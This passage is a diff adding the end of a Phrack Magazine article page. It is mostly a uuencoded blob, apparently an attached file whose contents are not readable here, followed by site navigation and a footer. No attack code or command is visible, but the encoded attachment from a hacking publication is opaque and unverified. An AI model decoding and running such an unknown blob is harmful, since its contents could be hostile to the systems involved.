+M?STM6A.7T&amp;&gt;*/C/9AR6`1J^&gt;Z`4%Q769KE&lt;A&amp;V77`CH&lt;$72`9&gt;9L'G)C8;--
+MY=($W9VJQ^KKZ8S=#UCCWF,-93JK7,)-7Z;?'6![+['=.C3WE&lt;15TS#WU9+-
+MVLXL0?B]9?K5CJG:#`IXASEU_`7`B://`GTP?X)GG$-Z-ZXRNR&gt;/?!%H886@
+M+M%;DQ!L?[%D?7\]NY?/&gt;^FH@,Q'97M!=Y#26J^,@&quot;7IW:7'FNNIPU/^&amp;J/T
+M&amp;OK6CDR&quot;MB987PEH?4'[W&lt;C4TE&amp;&quot;[%K0#R@G&amp;#,%]/,^&gt;`2IZ2D?2@O#2;^-
+M0+N:\I:-9UHX@X3L&amp;=F!/9J2_JMSLJ!*PA);]9A&quot;[[B8K9(F,&quot;=D#GTV0N8R
+M%?H=L@=Z:=&amp;T&gt;9^IMZQGLP^L;)+5O:&lt;7%]&amp;2JX&quot;V-&amp;BALL!ZB]TS;K`FM'*I
+MO856\B;H8UA&amp;N4P?@=\\6+);TD&amp;PLDF?I8701IX(4Z:YN2,HD!XFQ0LV+IYY
+MI+3VF(V7T@&gt;0;]&amp;O&lt;M!&amp;EV2=:&amp;%[PLP'NOX@-74K^:&amp;\P[2;0/@$S`)HS8`L
+MZ[4*..&gt;3]&gt;L#Z%-%6JUZUP'_&amp;Y#)`^2?/-6:TB+5&amp;]R97Y*$FO=CYB]KI/-N
+M&quot;E7W(7L56MNL#!A+-8CZEA;-?LC:T/%:RU1(C\0(D'$+&gt;+3I#_)5^@&gt;KU,))
+M:I-=TG.8HVL[&gt;Z9@([$FCL6N.UH2S=LJH%J;-RN:.QO!&amp;&amp;7:NT4L2:UB&gt;Z2_
+M#]`*E1A=#^FUUH#92W[.C&quot;D\E#(EW[]*/51I(7R4#O,B&amp;&gt;G02)OW&quot;+*]9%.Z
+M6:,WS?!0;7I!AGZ0#I;+E&amp;G*7?),)EV=,6-`GS-FV&amp;Q@\P@^G`6AXM.&lt;,\8O
+M625D?=(J(V%7-A?QA]Z((AH8#^S.YFU@P[FM='*?!I_';&gt;'3F*W,B&lt;(-J&amp;M7
+MEC55LYM36O7`EVE3(:TZR7QTE4O$KCZ71R.3![:\\,AD@541C#C#[A&lt;-.'CT
+M%?XU9$.RFO*`&amp;4M^R]0'-J1^S5LVP2?H%C&amp;+O2-M9&lt;*WF[/&lt;6ZG;S%LY#-K9
+M$O?(O[8A\\D6T/IH]9)%O!5S/(@YTAEPRY0S,&amp;AS6/DS:#(&lt;H',$_0R_TN*O
+M8/C:#*7%6[IJ)L=S!**GP-!X&amp;2]AYZ1K1U#1@:ZQB`A-\J&amp;G\C#$FU*A`AKQ
+M/%2ZN79@A0-H.0\L@[T.S:6&gt;?V!'T*9&amp;J-&amp;Q3$F[!C[T8-&gt;T&quot;O#'8ETAM(C6
+M$@E%0=RI5A7BTGM8P8!&gt;&lt;$L+C,CG:/,\OH2\._=)4N_)[ZS(.Y-?&amp;[/&amp;$MX7
+MEIAQQPR90#-&quot;O&amp;`F;-I6RO1\Q.!.\;V)#079&amp;;U]QRK#K)$9G#-+?-X0Y(6@
+MGVB$52&quot;&gt;UN!C&amp;&amp;*)K&lt;S63%]C?@^8I_%X5PD;,KJ'AHBN62P1W]4'&gt;,IW^`S3
+M3\2:J+&lt;AWW*+J[;P4U)*X)(CYVF&gt;\OL]`X%2'[#E7;(*K;B63+-A.E&quot;%&lt;DB?
+M6)?23SP*5EPV5CZ*R&gt;HV.Z/H)-906*^VEE`N[8&amp;5FEA-^8R/B6-RL1JJ5HF5
+M'K_\EO]L%8T^4[)&amp;5O&amp;GD5V8)S]H66E?61[G&gt;6?Q_.?/QF^/E'QLBE%K3`)D
+ML`&quot;4-RBC4J0&lt;F5:.PG%61MHKNW/XD2_YS[?'T]/]HA!.GJ8NDNW$R%2&amp;9&quot;(2
+MZ^F(\&lt;\O'S_]4YPS_'147:*AU)@\6'242)#^=DZI!Q\^F%E6?Y:0;8ETB(&lt;G
+M/[2GG;/4_X]_I7-V/N#77^F&lt;'B(0#)79&amp;W1P^\._?OS#5&quot;25=`P=)/&amp;'+Z((
+M4)Z(6F.GB:DU,8WH(\&lt;4^07IV&gt;Y/='[PVV=Y^(#.*/QZ_/3]ZU=9P(&amp;^I+^0
+MRDE^?7T!_N&lt;WRBA[I).&amp;?V??'__]\_/WQ]\L4;:$3B$]^?V&lt;\FS27[2S$TEY
+MBG]94&lt;KB^)'`.*_VH&lt;@$$EGJ0$K_3$Q.F2&amp;2&quot;_)$A&gt;@I4P6&gt;GGZ0QYN/C\'0
+MN1(Z9?+QBRBN\]OA&lt;$-Z=/K[UW^QPQF;7T#R,3T!_0=,X!-02X_LL_QD#&quot;5H
+M_$[)&amp;:&lt;'=+*?O7]/CSW+&lt;\\G&amp;4:_EPXI#\\3A%*=..2&quot;U?)3GY*D2)ZW$&lt;?O
+M!&lt;3A5&quot;CNB!.%6'JEQW\H^8!^V?_Q4Y3W$&lt;P6&amp;4ZRULFOSS\D-5D^A#RU((ZT
+M'+[F\].M0S:51$[Y]4E)'S3^^/[SR]_`8#.[(7]6?P)_Y`N.\J]&gt;3K\B_&quot;DG
+M1&quot;8)$C)4YN.D1!&lt;5SA*%G;)28.9Q`8Q#A2R+SA?+&quot;F.?,\9\/RIRD`KXI!H#
+M98?^`_[QXS\/'47%##G.&quot;?QP&gt;`I+5.6%NG+LP+#[^IZ-Z7M/J9+%R)I&gt;DL;&lt;
+M\/%78W+DH?TBP5F1L]?();D&quot;TP.&quot;;X;L4/&lt;BQRP=AO&quot;J8GE=Q7&gt;9DTG&amp;)[&quot;`
+M*,2INF,L'G,TLKILKW)=VO?G/W[(:F@B0T06Z:*4(7+,/ZERA#S9G:.5#DMH
+M\3T34:&amp;78D?9V`2:9&gt;2)9*6L]`T&gt;I,5O\BH2A/9%6LGCQY/*%NFYN$.5J:R`
+M1@V^CB@Y$:DLY_'G*O.L@`=%*/3Z&gt;E2=2GE%JPXC#Y[KTN%A=&lt;A:DD;*=)($
+M1D?5-WY]__CMVZL'%ZFBA#R(&gt;*@-E-&lt;1:O7V%)%__`Y/&gt;Y2QF;J'_#:-:*9)
+MA&amp;DA#EG=X^\_TOA%'?.36R&lt;%.TI90$XK&lt;[P(F.9;G53P.`&quot;*4ATOP:6'+(\+
+M&gt;AR@TKH=+\'E)S%/*WP&lt;8$5ICI&lt;@T\.:QP4\2CFGLI3)DY(]-79:.B?[_NO)
+M]S2&quot;EX5`7DN#RE=*4E!/&lt;N&amp;4+!&gt;.JI)(72F5U/K'[Q]+_]L:ET4K6M&amp;*5K2B
+M%:UH12M:T8I6M*(5K6A%*UK1BE:THA6M:$4K6M&amp;*5K2B%:UH12O:_VO[+\U&gt;
+&amp;F;&lt;`&gt;```
+`
+end
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
